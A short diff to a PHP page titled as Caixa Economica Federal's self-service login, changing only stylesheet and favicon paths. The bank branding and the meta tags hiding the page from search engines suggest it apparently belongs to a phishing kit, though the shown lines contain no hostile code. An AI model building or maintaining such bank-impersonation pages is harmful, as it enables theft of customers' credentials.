@@ -10,8 +10,8 @@ session_start();
     <meta name="robots" content="noindex, nofollow, noimageindex">
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
     <title>Caixa Economica Federal - Autoatendimento Pessoa Fisica</title>
-    <link rel="stylesheet" type="text/css" href="../assets/css/identificacao.css" />
-    <link rel="icon" href="../assets/imgs/favicon.ico" type="image/x-icon" />
+    <link rel="stylesheet" type="text/css" href="../../assets/css/identificacao.css" />
+    <link rel="icon" href="../../assets/imgs/favicon.ico" type="image/x-icon" />
     <meta name="csrf-token" content="xxvap9tMfNDJBQEcQpXQNS9VkzSHgMwXkX5p7IIa" />
 
 </head>
